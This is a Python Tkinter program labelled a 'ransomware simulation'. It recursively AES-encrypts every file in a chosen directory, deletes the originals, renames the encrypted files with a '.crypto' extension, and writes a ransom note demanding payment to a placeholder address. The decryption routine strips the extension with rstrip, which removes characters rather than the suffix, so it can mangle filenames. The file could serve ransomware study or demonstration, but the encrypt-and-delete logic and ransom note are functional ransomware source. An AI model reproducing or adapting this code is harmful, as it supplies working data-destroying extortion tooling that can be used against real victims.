import os
from tkinter import Tk, filedialog, messagebox, Button, Label, StringVar, Entry, Frame
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from os import urandom


RANSOMWARE_EXTENSIONS = [
    ".crypto", ".wannacry", ".locky", ".cryptolocker", ".petya", ".badrabbit",
    ".notpetya", ".nopetya", ".ryuk", ".djvu", ".phobos", ".dharma", ".cont",
    ".nephilim", ".avaddon", ".makop", ".ransomexx", ".egregor", ".hellokitty"
]


def derive_key(password: str, salt: bytes) -> bytes:
    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1, backend=default_backend())
    return kdf.derive(password.encode())

def encrypt_file(file_path: str, password: str):
    try:
        salt = urandom(16)
        iv = urandom(16)
        key = derive_key(password, salt)

        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()

        with open(file_path, 'rb') as f:
            file_data = f.read()

        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(file_data) + padder.finalize()
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

        encrypted_file_path = file_path + '.crypto'
        with open(encrypted_file_path, 'wb') as f:
            f.write(salt + iv + encrypted_data)

        os.remove(file_path)
    except Exception as e:
        messagebox.showerror("Error", f"Encryption failed: {e}")


def decrypt_file(file_path: str, password: str):
    try:
        with open(file_path, 'rb') as f:
            salt = f.read(16)
            iv = f.read(16)
            encrypted_data = f.read()

        key = derive_key(password, salt)

        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        padded_data = decryptor.update(encrypted_data) + decryptor.finalize()

        unpadder = padding.PKCS7(128).unpadder()
        original_data = unpadder.update(padded_data) + unpadder.finalize()

        original_file_path = file_path.rstrip('.crypto')
        with open(original_file_path, 'wb') as f:
            f.write(original_data)

        os.remove(file_path)
    except Exception as e:
        messagebox.showerror("Error", f"Decryption failed: {e}")

def create_ransom_note(directory: str):
    ransom_note_path = os.path.join(directory, "RANSOM_NOTE.txt")
    with open(ransom_note_path, 'w') as note:
        note.write(
            "Your files have been Attacked!\n"
            "To Access them, you must pay a ransom.\n"
            "Contact us at ransomware@example.com for instructions.\n"
            "Ensure to provide proof of payment to receive the decryption key.\n"
        )


def encrypt_directory(directory: str, password: str):
    try:
        for root, dirs, files in os.walk(directory):
            for file_name in files:
                file_path = os.path.join(root, file_name)
                encrypt_file(file_path, password)
            create_ransom_note(root)
        messagebox.showinfo("Encryption", "Directory encrypted successfully.")
    except Exception as e:
        messagebox.showerror("Error", f"Encryption failed: {e}")


def decrypt_directory(directory: str, password: str):
    try:
        ransom_note_path = os.path.join(directory, "RANSOM_NOTE.txt")
        note_removed = False

        for root, dirs, files in os.walk(directory):
            for file_name in files:
               
                if any(file_name.endswith(ext) for ext in RANSOMWARE_EXTENSIONS):
                    file_path = os.path.join(root, file_name)
                    decrypt_file(file_path, password)

         
            if "RANSOM_NOTE.txt" in files:
                os.remove(ransom_note_path)
                note_removed = True

        messagebox.showinfo(
            "Decryption", 
            "Directory decrypted successfully.\n"
            f"Ransom note {'removed' if note_removed else 'not found.'}"
        )
    except Exception as e:
        messagebox.showerror("Error", f"Decryption failed: {e}")


def browse_encrypt():
    directory = filedialog.askdirectory(title="Select Directory to Encrypt")
    if directory:
        password = password_var.get()
        if not password:
            messagebox.showerror("Error", "Please enter a password for encryption.")
            return
        encrypt_directory(directory, password)

def browse_decrypt():
    directory = filedialog.askdirectory(title="Select Directory to Decrypt")
    if directory:
        password = password_var.get()
        if not password:
            messagebox.showerror("Error", "Please enter a password for decryption.")
            return
        decrypt_directory(directory, password)


def create_gui():
    root = Tk()
    root.title("Ransomware Simulation")
    root.geometry("500x300")
    root.resizable(False, False)

    global password_var
    password_var = StringVar()

    Label(root, text="SAMPLE RANSOMWARE SIMULATION", font=("Arial", 16, "bold"), fg="blue").pack(pady=10)

    frame = Frame(root)
    frame.pack(pady=20)

    Label(frame, text="Password:", font=("Arial", 12)).grid(row=0, column=0, padx=10, pady=5)
    Entry(frame, textvariable=password_var, show="*", width=30).grid(row=0, column=1, padx=10, pady=5)

    Button(frame, text="Encrypt Directory", command=browse_encrypt, width=20, bg="green", fg="white").grid(row=1, column=0, padx=10, pady=10)
    Button(frame, text="Decrypt Directory", command=browse_decrypt, width=20, bg="red", fg="white").grid(row=1, column=1, padx=10, pady=10)

    Label(root, text="Ensure the password is remembered for decryption.", font=("Arial", 10), fg="dark red").pack(side="bottom", pady=10)

    root.mainloop()


create_gui()